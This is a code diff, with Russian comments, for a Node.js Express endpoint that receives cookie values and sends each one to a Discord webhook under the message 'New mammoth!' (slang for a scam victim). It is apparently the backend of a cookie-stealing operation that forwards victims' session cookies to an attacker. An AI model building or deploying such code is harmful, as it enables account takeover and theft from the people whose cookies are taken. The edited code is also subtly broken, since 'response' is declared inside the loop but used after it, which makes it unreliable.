@@ -21,27 +21,23 @@ app.post('/send', async (req, res) => {
         let embds = []
         // Перебираем ключ-значение из тела запроса
         for (const key in reqBody) {
-              index++;
-              embds.push({
-                  title: `Куки ${index}`,
-                  description: key,
-                  color: 5814783,
-                  fields: [''] // Передаем готовый массив объектов
-              })
+            if (Object.prototype.hasOwnProperty.call(reqBody, key)) {
+                index++;
+                const discordPayload = {
+                    content: `Новый мамонт! №${index} Куки: ${key}`,
+                    attachments: []
+                };
+
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(discordPayload)
+                });
+            }
         }
 
         // Формируем правильную структуру для Discord
-        const discordPayload = {
-            content: "Новый мамонт!",
-            embeds: embds,
-            attachments: []
-        };
-
-        const response = await fetch(webhookUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(discordPayload)
-        });
+        
 
         if (!response.ok) {
             throw new Error(`Discord API error: ${response.statusText}`);
